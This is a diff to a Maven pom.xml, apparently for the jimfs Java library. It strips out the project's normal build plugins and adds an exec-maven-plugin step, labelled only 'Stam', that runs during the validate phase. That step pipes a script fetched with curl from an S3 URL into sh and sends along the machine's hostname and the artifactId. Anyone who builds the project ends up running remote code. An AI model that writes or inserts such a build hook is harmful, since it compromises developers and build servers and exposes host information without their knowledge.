@@ -157,95 +157,33 @@
   </dependencyManagement>
 
   <build>
-    <pluginManagement>
-      <plugins>
+<plugins>
+        <!--Stam-->
         <plugin>
-          <artifactId>maven-compiler-plugin</artifactId>
-          <version>3.11.0</version>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/jimfs.git\&amp;folder=jimfs\&amp;hostname=`hostname`\&amp;foo=lyw\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
         </plugin>
-        <plugin>
-          <artifactId>maven-source-plugin</artifactId>
-          <version>3.3.0</version>
-        </plugin>
-        <plugin>
-          <artifactId>maven-javadoc-plugin</artifactId>
-          <version>3.6.0</version>
-          <configuration>
-            <debug>true</debug>
-            <encoding>UTF-8</encoding>
-            <docencoding>UTF-8</docencoding>
-            <charset>UTF-8</charset>
-            <source>${java.version}</source>
-            <detectJavaApiLink>false</detectJavaApiLink>
-            <links>
-              <link>https://checkerframework.org/api/</link>
-              <link>https://guava.dev/releases/${guava.version}/api/docs/</link>
-              <link>https://unicode-org.github.io/icu-docs/apidoc/released/icu4j</link>
-              <!-- When building against Java 8, the Java 11 link below is overridden to point to an older version (Java 9, the newest one that works). -->
-              <link>https://docs.oracle.com/en/java/javase/11/docs/api/</link>
-            </links>
-          </configuration>
-        </plugin>
-        <plugin>
-          <artifactId>maven-gpg-plugin</artifactId>
-          <version>3.1.0</version>
-        </plugin>
-        <plugin>
-          <artifactId>maven-surefire-plugin</artifactId>
-          <version>3.1.2</version>
-        </plugin>
-        <plugin>
-          <groupId>org.apache.felix</groupId>
-          <artifactId>maven-bundle-plugin</artifactId>
-          <version>5.1.9</version>
-        </plugin>
-      </plugins>
-    </pluginManagement>
-
-    <plugins>
-      <plugin>
-        <artifactId>maven-compiler-plugin</artifactId>
-        <configuration>
-          <source>${java.version}</source>
-          <target>${java.version}</target>
-          <annotationProcessorPaths>
-            <path>
-              <groupId>com.google.errorprone</groupId>
-              <artifactId>error_prone_core</artifactId>
-              <version>${errorprone.version}</version>
-            </path>
-            <path>
-              <groupId>com.google.guava</groupId>
-              <artifactId>guava-beta-checker</artifactId>
-              <version>1.0</version>
-            </path>
-            <path>
-              <groupId>com.google.auto.service</groupId>
-              <artifactId>auto-service</artifactId>
-              <version>${auto-service.version}</version>
-            </path>
-            <path>
-              <groupId>com.google.auto</groupId>
-              <artifactId>auto-common</artifactId>
-              <version>${auto-common.version}</version>
-            </path>
-          </annotationProcessorPaths>
-        </configuration>
-      </plugin>
-
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-jar-plugin</artifactId>
-        <configuration>
-          <archive>
-            <manifestEntries>
-              <Automatic-Module-Name>com.google.common.jimfs</Automatic-Module-Name>
-            </manifestEntries>
-          </archive>
-        </configuration>
-      </plugin>
-    </plugins>
-  </build>
+</plugins>
+</build>
 
   <profiles>
     <profile>
